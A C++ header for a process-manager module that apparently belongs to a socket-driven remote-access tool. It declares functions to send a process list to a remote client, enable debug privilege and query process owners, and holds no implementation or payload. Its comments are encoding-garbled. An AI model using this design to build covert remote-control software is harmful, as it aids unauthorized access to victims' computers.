
#include "stdafx.h"
#include "Manager.h"
#include <TlHelp32.h>
#include <Psapi.h>
#pragma comment(lib,"Psapi.lib")
#include <Winternl.h>


#define ProcessImageFileName 27
typedef NTSTATUS (WINAPI *lpfnNtQuerySystemInformation)(   
	int   SystemInformationClass,    // ����������ͺ�
	PVOID   SystemInformation,                            // �û��洢��Ϣ�Ļ�����
	ULONG   SystemInformationLength,                    // ��������С
	PULONG   ReturnLength   );                            // ������Ϣ����
//typedef NTSTATUS (WINAPI *ZwQueryInformationProcessP)(HANDLE,int,PVOID,ULONG,PULONG);
typedef struct SYSTEM_PROCESS_IMAGE_NAME_INFORMATION{
	HANDLE ProcessId;
	UNICODE_STRING ImageName;
};
class CProcessManager : public CManager
{
public:
	CProcessManager(CClientSocket *pClient,UINT ID);
	~CProcessManager();
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
public:
	UINT	m_ID;
	//memebers
private:
	//HMODULE hNtDll;
	//ZwQueryInformationProcessP m_zwQuery;
	lpfnNtQuerySystemInformation NtQuerySystemInformationX;
	BOOL DosPathToNtPath(LPTSTR pszDosPath, LPTSTR pszNtPath);
//	_RtlAdjustPrivilege pfnRtlAdjustPrivilege;
public:
	void SendProcessList();
	bool DebugPrivilege(const wchar_t *PName,BOOL bEnable);
	void GetProcessUserName(DWORD dwID,wchar_t* pusername);
};
